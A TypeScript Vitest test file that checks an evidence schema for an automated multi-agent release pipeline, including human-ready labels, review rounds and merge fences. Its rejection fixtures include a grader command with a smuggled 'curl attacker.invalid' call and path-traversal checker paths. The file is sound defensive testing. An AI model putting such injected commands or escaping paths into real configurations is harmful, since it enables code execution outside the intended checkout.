import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { Ajv2020 } from 'ajv/dist/2020.js';
import { afterAll, describe, expect, it } from 'vitest';
import type { AgentRoutingConfig } from '../src/config.js';
import { INTERVENTION_KINDS } from '../src/domain/schema.js';
import { liveReleaseSemanticErrors } from '../src/evidence/live-release.js';
import { inferRepositoryGraders } from '../src/runner/adapter.js';

const finalHead = 'a'.repeat(40);
const round1Head = 'b'.repeat(40);
const mergeSha = 'c'.repeat(40);
const consumerHead = 'f'.repeat(40);
const digest = `sha256:${'d'.repeat(64)}`;
const sha256 = 'e'.repeat(64);
const jobId = '22222222-2222-4222-8222-222222222222';
const attemptId = '33333333-3333-4333-8333-333333333333';
const leaseId = '44444444-4444-4444-8444-444444444444';
const promotionJobId = '55555555-5555-4555-8555-555555555555';

const reviewer = (
  agent: string,
  head: string,
  findingCount: number,
) => ({
  agent,
  head,
  readOnly: true,
  worktreeClean: true,
  verdict: findingCount === 0 ? 'approve' : 'request_changes',
  hasFindings: findingCount > 0,
  findingCount,
});

const invocation = (role: string, provider: string, head?: string) => ({
  role,
  provider,
  model: `${provider}-model-1`,
  invocationKey: `inv_${role}_${provider}`,
  jobId: role === 'triage' ? promotionJobId : jobId,
  ...(head ? { head } : {}),
  observedAt: '2026-08-01T00:00:00Z',
});

const artifact = (kind: string, name: string) => ({
  kind,
  uri: `evidence/live-release/${name}`,
  sha256,
  sizeBytes: 1024,
  sourceHead: finalHead,
  observedAt: '2026-08-01T00:00:00Z',
});

function validEvidence(): any {
  return {
    schemaVersion: '2.0',
    target: {
      repository: 'mrbaron3/designflow',
      issueNumber: 4,
      monitoredRepositories: ['mrbaron3/workflow', 'mrbaron3/designflow'],
      registrationVersion: 1,
    },
    consumer: {
      repository: 'mrbaron3/workflow',
      head: consumerHead,
      observedAt: '2026-08-01T00:00:00Z',
    },
    triage: {
      passed: true,
      observedAt: '2026-08-01T00:01:00Z',
      repository: 'mrbaron3/designflow',
      issueNumber: 4,
      decisionSchemaVersion: 1,
      readiness: 'ready_candidate',
      managedLabelsApplied: ['ready-candidate'],
      aiAppliedReadyLabel: false,
      humanReadyLabel: 'ready',
      humanReadyAppliedAt: '2026-08-01T00:02:00Z',
      claimedLabel: 'agent-claimed',
      promotionJobId,
      promotionAtomic: true,
      sourceDigest: sha256,
    },
    execution: {
      passed: true,
      observedAt: '2026-08-01T00:03:00Z',
      repository: 'mrbaron3/designflow',
      issueNumber: 4,
      mode: 'ACTIVE',
      jobId,
      attemptId,
      leaseId,
      expectedHead: finalHead,
      finalHead,
      graderProfileSource: 'repository-metadata',
      graderCommands: ['node scripts/check-contracts.mjs'],
      auditSha256: sha256,
    },
    formalReviews: {
      roundCount: 2,
      round1: {
        passed: true,
        head: round1Head,
        reviewers: [reviewer('codex', round1Head, 1), reviewer('claude', round1Head, 0)],
        allConfirmedFindingsResolved: true,
      },
      round2: {
        passed: true,
        head: finalHead,
        reviewers: [reviewer('codex', finalHead, 0), reviewer('claude', finalHead, 0)],
        allConfirmedFindingsResolved: true,
      },
      round3Created: false,
    },
    github: {
      observedAt: '2026-08-01T00:04:00Z',
      repository: 'mrbaron3/designflow',
      issueNumber: 4,
      pullRequestNumber: 12,
      finalPrHead: finalHead,
      mergeSha,
      expectedHeadMatchEnforced: true,
      requiredChecks: { contracts: 'SUCCESS' },
      blockingReviewThreads: 0,
      sourceIssueClosure: 'completed',
      mergeReachableFromDefaultBranch: true,
    },
    providerInvocations: [
      invocation('triage', 'claude'),
      invocation('generator', 'codex', finalHead),
      invocation('reviewer', 'claude', finalHead),
    ],
    designBundle: {
      applicable: true,
      bundleDigest: digest,
      revisionId: 'rev-2',
      approvedAt: '2026-08-01T00:00:30Z',
    },
    releaseLineage: {
      applicable: true,
      status: 'verified',
      intakeKey: 'intake-1',
      candidateKey: 'candidate-1',
      revisionId: 'rev-2',
      bundleDigest: digest,
      issueId: 'ISSUE-0001',
      prId: 'PR-12',
      headSha: finalHead,
      reasons: [],
    },
    howInterventions: { count: 0, records: [] },
    artifacts: [
      artifact('github-current-state', 'github-state.json'),
      artifact('audit-export', 'audit.json'),
      artifact('provider-invocation', 'invocations.json'),
    ],
    result: 'passed',
  };
}

function compiled(version: 'v1' | 'v2' = 'v2') {
  const schema = JSON.parse(
    fs.readFileSync(new URL(
      version === 'v2'
        ? '../../../contracts/live-release-evidence-v2.schema.json'
        : '../../../contracts/live-release-evidence.schema.json',
      import.meta.url,
    ), 'utf8'),
  ) as object;
  return new Ajv2020({ strict: true, allErrors: true }).compile(schema);
}

/**
 * The schema spells its enums out as JSON literals, so it can drift from the
 * code that produces the values. These guards fail the moment a vocabulary
 * grows on one side only.
 */
describe('live release evidence vocabularies track the code', () => {
  const schema = JSON.parse(
    fs.readFileSync(new URL(
      '../../../contracts/live-release-evidence-v2.schema.json',
      import.meta.url,
    ), 'utf8'),
  ) as any;

  it('enumerates exactly the attested intervention kinds', () => {
    const kinds = schema.$defs.howInterventions
      .properties.records.items.properties.kind.enum;
    expect(kinds).toEqual([...INTERVENTION_KINDS]);
  });

  it('enumerates every role the runner routes, plus triage', () => {
    // Fails to compile if a role is added to the routing table without being
    // added here — Record demands every key.
    const routed: Record<Exclude<keyof AgentRoutingConfig, 'perspectives'>, true> = {
      generator: true,
      planning: true,
      uiDesign: true,
      reviewer: true,
    };
    const roles = schema.$defs.providerInvocation.properties.role.enum;
    expect([...roles].sort()).toEqual([...Object.keys(routed), 'triage'].sort());
  });
});

/**
 * The evidence format must not certify a grader the runner would have refused.
 * Comparing the two by string would only restate the pattern, so this drives
 * the real inference and checks that acceptance and rejection line up.
 */
describe('grader commands are expressible exactly when the runner emits them', () => {
  const roots: string[] = [];
  afterAll(() => {
    for (const root of roots) fs.rmSync(root, { recursive: true, force: true });
  });

  const schema = JSON.parse(
    fs.readFileSync(new URL(
      '../../../contracts/live-release-evidence-v2.schema.json',
      import.meta.url,
    ), 'utf8'),
  ) as any;
  const validateCommand = new Ajv2020({ strict: true, allErrors: true })
    .compile(schema.$defs.graderCommand);

  const repository = (manifest: object, checker?: string) => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'grader-profile-'));
    roots.push(root);
    if (checker) {
      fs.mkdirSync(path.join(root, path.dirname(checker)), { recursive: true });
      fs.writeFileSync(path.join(root, checker), 'process.exitCode = 0;\n');
    }
    fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify(manifest));
    return root;
  };

  it.each([
    ['direct Node contract checker', () => repository(
      { name: 'target', scripts: { test: 'node scripts/check-contracts.mjs' } },
      'scripts/check-contracts.mjs',
    )],
    ['vendored typescript and vitest toolchain', () => repository(
      { name: 'target', devDependencies: { typescript: '^5', vitest: '^3' } },
    )],
  ])('expresses every command the %s profile emits', (_name, build) => {
    const graders = inferRepositoryGraders(build());
    const commands = [...new Set(Object.values(graders.commands ?? {}))];
    expect(commands.length).toBeGreaterThan(0);
    for (const command of commands) {
      expect(validateCommand(command), `${command}: ${JSON.stringify(validateCommand.errors)}`)
        .toBe(true);
    }
  });

  it.each([
    ['..', '../../tmp/fake.js'],
    ['an absolute path', '/tmp/fake.js'],
    ['a mid-path escape', 'scripts/../../fake.js'],
    ['a single-dot segment', './fake.js'],
  ])('refuses a checker reaching outside the checkout via %s', (_name, script) => {
    const root = repository({ name: 'target', scripts: { test: `node ${script}` } });
    // The runner refuses to build a profile from it at all. Which of its three
    // refusals fires depends on the path shape, so match any of them.
    expect(() => inferRepositoryGraders(root)).toThrow(
      /bounded grader profile|checker path is unsafe|checker is absent/,
    );
    // … and the evidence format refuses to record it as one that passed.
    expect(validateCommand(`node ${script}`)).toBe(false);
  });
});

describe('live release evidence contract', () => {
  it('accepts one structurally complete and coherently bound external release', () => {
    const validate = compiled();
    const evidence = validEvidence();
    expect(validate(evidence), JSON.stringify(validate.errors)).toBe(true);
    expect(liveReleaseSemanticErrors(evidence)).toEqual([]);
  });

  it('keeps immutable external evidence v1 valid under its original schema', () => {
    const legacy = structuredClone(validEvidence());
    legacy.schemaVersion = '1.0';
    for (const round of [legacy.formalReviews.round1, legacy.formalReviews.round2]) {
      for (const recordedReview of round.reviewers) {
        recordedReview.verdict = recordedReview.findingCount === 0
          ? 'no_findings'
          : 'findings';
        delete recordedReview.hasFindings;
      }
    }
    legacy.github.pullRequest = legacy.github.pullRequestNumber;
    legacy.github.issueState = 'CLOSED';
    legacy.github.issueStateReason = 'COMPLETED';
    delete legacy.github.pullRequestNumber;
    delete legacy.github.sourceIssueClosure;

    const validate = compiled('v1');
    expect(validate(legacy), JSON.stringify(validate.errors)).toBe(true);
    expect(liveReleaseSemanticErrors(legacy)).toEqual([]);
  });

  it('accepts a headless target that states why no design bundle applies', () => {
    const validate = compiled();
    const evidence = validEvidence();
    evidence.designBundle = {
      applicable: false,
      reason: 'AuthoringBackend port is headless and produces no design bundle',
    };
    evidence.releaseLineage = {
      applicable: false,
      reason: 'the run consumed no Designflow design contract',
    };
    expect(validate(evidence), JSON.stringify(validate.errors)).toBe(true);
    expect(liveReleaseSemanticErrors(evidence)).toEqual([]);
  });

  it('records interventions without losing the artifact, and reads them into result', () => {
    const validate = compiled();
    const evidence = validEvidence();
    evidence.howInterventions = {
      count: 1,
      records: [{
        kind: 'manual-evidence-collection',
        reason: 'operator exported the audit trail by hand',
        issueId: 'ISSUE-0001',
        createdAt: '2026-08-01T00:05:00Z',
      }],
    };
    evidence.result = 'passed-with-interventions';
    expect(validate(evidence), JSON.stringify(validate.errors)).toBe(true);
    expect(liveReleaseSemanticErrors(evidence)).toEqual([]);
  });

  it.each([
    // The coordinate is not pinned: a whole run against another repository or
    // issue is valid as long as every observed section moves with the target.
    ['an entirely different target repository', (v: any) => {
      v.target.repository = 'another-owner/another-target';
      v.target.monitoredRepositories = ['mrbaron3/workflow', 'another-owner/another-target'];
      for (const section of [v.triage, v.execution, v.github]) {
        section.repository = 'another-owner/another-target';
      }
    }],
    ['issue number pinned', (v: any) => {
      v.target.issueNumber = 999;
      for (const section of [v.triage, v.execution, v.github]) {
        section.issueNumber = 999;
      }
    }],
    ['pull request number pinned', (v: any) => { v.github.pullRequestNumber = 999; }],
    ['check name pinned', (v: any) => { v.github.requiredChecks = { 'some-other-check': 'SUCCESS' }; }],
  ])('stays reusable when the run differs by %s', (_name, mutate) => {
    const validate = compiled();
    const evidence = validEvidence();
    mutate(evidence);
    expect(validate(evidence), JSON.stringify(validate.errors)).toBe(true);
    expect(liveReleaseSemanticErrors(evidence)).toEqual([]);
  });

  it.each([
    ['self-targeted run', (v: any) => { v.target.repository = v.consumer.repository; }],
    ['target outside the monitored set', (v: any) => { v.target.monitoredRepositories = ['mrbaron3/workflow', 'other/repo']; }],
    ['evidence relabeled to another issue number', (v: any) => { v.target.issueNumber = 999; }],
    ['evidence relabeled to another repository and monitored set', (v: any) => {
      v.target.repository = 'another-owner/another-target';
      v.target.monitoredRepositories = ['mrbaron3/workflow', 'another-owner/another-target'];
    }],
    ['a triage decision recorded against another issue', (v: any) => { v.triage.issueNumber = 999; }],
    ['an execution job serving another repository', (v: any) => { v.execution.repository = 'mrbaron3/workflow'; }],
    ['a github observation of another issue', (v: any) => { v.github.issueNumber = 999; }],
    ['a ready label applied after execution was observed', (v: any) => { v.triage.humanReadyAppliedAt = '2026-08-01T00:03:30Z'; }],
    ['a ready label applied after the final GitHub observation', (v: any) => { v.triage.humanReadyAppliedAt = '2026-08-01T00:05:00Z'; }],
    ['a ready label applied before the triage decision', (v: any) => { v.triage.humanReadyAppliedAt = '2026-08-01T00:00:30Z'; }],
    ['an execution observed after the final GitHub observation', (v: any) => { v.execution.observedAt = '2026-08-01T00:04:30Z'; }],
    ['a ready application tied to the execution observation instant', (v: any) => { v.triage.humanReadyAppliedAt = v.execution.observedAt; }],
    ['a ready application later than execution by fractional seconds only', (v: any) => { v.triage.humanReadyAppliedAt = '2026-08-01T00:03:00.5Z'; }],
    ['merge fence on an earlier head', (v: any) => { v.execution.expectedHead = round1Head; }],
    ['review of a stale head', (v: any) => { v.formalReviews.round2.head = round1Head; }],
    ['reviewer reading a different head', (v: any) => { v.formalReviews.round2.reviewers[0].head = round1Head; }],
    ['finding flag disagreeing with finding count', (v: any) => { v.formalReviews.round2.reviewers[0].hasFindings = true; }],
    ['the same agent reviewing twice', (v: any) => { v.formalReviews.round2.reviewers[1].agent = 'codex'; }],
    ['findings answered by no new commit', (v: any) => { v.formalReviews.round1.head = finalHead; v.formalReviews.round1.reviewers.forEach((r: any) => { r.head = finalHead; }); }],
    ['a ready label the automation also claims with', (v: any) => { v.triage.claimedLabel = 'ready'; }],
    ['triage writing the ready label itself', (v: any) => { v.triage.managedLabelsApplied = ['ready']; }],
    ['a duplicated provider invocation', (v: any) => { v.providerInvocations[1].invocationKey = 'inv_triage_claude'; }],
    ['no development invocation', (v: any) => { v.providerInvocations = v.providerInvocations.filter((i: any) => i.role !== 'generator'); }],
    ['a lineage naming another bundle', (v: any) => { v.releaseLineage.bundleDigest = `sha256:${'9'.repeat(64)}`; }],
    ['a lineage naming another design revision', (v: any) => { v.releaseLineage.revisionId = 'rev-9'; }],
    ['a lineage bound to another head', (v: any) => { v.releaseLineage.headSha = round1Head; }],
    ['an approved bundle with no verified lineage', (v: any) => { v.releaseLineage = { applicable: false, reason: 'skipped' }; }],
    ['a verified lineage with no approved bundle', (v: any) => { v.designBundle = { applicable: false, reason: 'skipped' }; }],
    ['a triage call from another triage job', (v: any) => { v.providerInvocations[0].jobId = jobId; }],
    ['a development call from another run', (v: any) => { v.providerInvocations[1].jobId = '66666666-6666-4666-8666-666666666666'; }],
    ['an intervention count that undercounts its records', (v: any) => { v.howInterventions.records = [{ kind: 'workspace-hand-edit', reason: 'x', issueId: 'ISSUE-0001', createdAt: '2026-08-01T00:05:00Z' }]; }],
    ['interventions reported as a clean run', (v: any) => { v.howInterventions = { count: 1, records: [{ kind: 'workspace-hand-edit', reason: 'x', issueId: 'ISSUE-0001', createdAt: '2026-08-01T00:05:00Z' }] }; }],
    ['an artifact from another revision', (v: any) => { v.artifacts[0].sourceHead = round1Head; }],
    ['an artifact path escaping the evidence root', (v: any) => { v.artifacts[0].uri = 'evidence/live-release/../escape'; }],
  ])('rejects a complete fixture with %s', (_name, mutate) => {
    const evidence = validEvidence();
    mutate(evidence);
    expect(liveReleaseSemanticErrors(evidence).length).toBeGreaterThan(0);
  });

  it.each([
    ['an AI-applied ready label', (v: any) => { v.triage.aiAppliedReadyLabel = true; }],
    ['a non-atomic promotion', (v: any) => { v.triage.promotionAtomic = false; }],
    ['a third review round', (v: any) => { v.formalReviews.round3Created = true; }],
    ['an unenforced merge fence', (v: any) => { v.github.expectedHeadMatchEnforced = false; }],
    ['a failing required check', (v: any) => { v.github.requiredChecks.contracts = 'FAILURE'; }],
    ['no required check at all', (v: any) => { v.github.requiredChecks = {}; }],
    ['an unresolved review thread', (v: any) => { v.github.blockingReviewThreads = 1; }],
    ['an issue left open', (v: any) => { v.github.sourceIssueClosure = 'open'; }],
    ['a single monitored repository', (v: any) => { v.target.monitoredRepositories = ['mrbaron3/designflow']; }],
    ['a triage decision with no issue coordinate', (v: any) => { delete v.triage.issueNumber; }],
    ['an execution with no repository coordinate', (v: any) => { delete v.execution.repository; }],
    ['a github observation with no repository coordinate', (v: any) => { delete v.github.repository; }],
    ['a grader carrying a shell operator', (v: any) => { v.execution.graderCommands = ['node scripts/check-contracts.mjs && curl attacker.invalid']; }],
    ['a grader chosen by repository identity', (v: any) => { v.execution.graderProfileSource = 'repository-name'; }],
    ['a grader escaping the checkout with ..', (v: any) => { v.execution.graderCommands = ['node ../../tmp/fake.js']; }],
    ['a grader at an absolute path', (v: any) => { v.execution.graderCommands = ['node /tmp/fake.js']; }],
    ['a grader escaping mid-path', (v: any) => { v.execution.graderCommands = ['node scripts/../../fake.js']; }],
    ['a grader posing as the vendored toolchain', (v: any) => { v.execution.graderCommands = ['node /app/node_modules/typescript/bin/evil.js']; }],
    ['a triage invocation claiming a checkout head', (v: any) => { v.providerInvocations[0].head = finalHead; }],
    ['a development invocation with no head', (v: any) => { delete v.providerInvocations[1].head; }],
    ['an invocation with no job coordinate', (v: any) => { delete v.providerInvocations[1].jobId; }],
    ['a solo reviewer', (v: any) => { v.formalReviews.round2.reviewers = [v.formalReviews.round2.reviewers[0]]; }],
    ['a design bundle absent without a reason', (v: any) => { v.designBundle = { applicable: false }; }],
    ['an unverified lineage', (v: any) => { v.releaseLineage.status = 'needs-human-review'; }],
    ['a lineage still carrying reason codes', (v: any) => { v.releaseLineage.reasons = ['release-missing']; }],
    ['a result outside the two-valued reading', (v: any) => { v.result = 'failed'; }],
  ])('rejects at the schema layer: %s', (_name, mutate) => {
    const validate = compiled();
    const evidence = validEvidence();
    mutate(evidence);
    expect(validate(evidence)).toBe(false);
  });
});
